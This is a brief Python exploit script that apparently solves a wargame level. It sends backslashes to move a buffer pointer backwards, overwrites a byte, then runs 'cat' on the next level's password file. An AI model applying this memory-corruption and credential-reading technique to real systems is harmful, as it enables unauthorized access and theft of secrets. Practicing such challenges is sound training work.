import os
import time

os.write(1, b'\\' * 254)
pointer = b'\xca\x00\x00\x00'
cmd = b'cat /etc/vortex_pass/vortex2\x0a'

for i in range(0,100):
    os.write(1, pointer)
    os.write(1, cmd)
    os.write(1, b'\\' * (len(pointer) + len(cmd)))
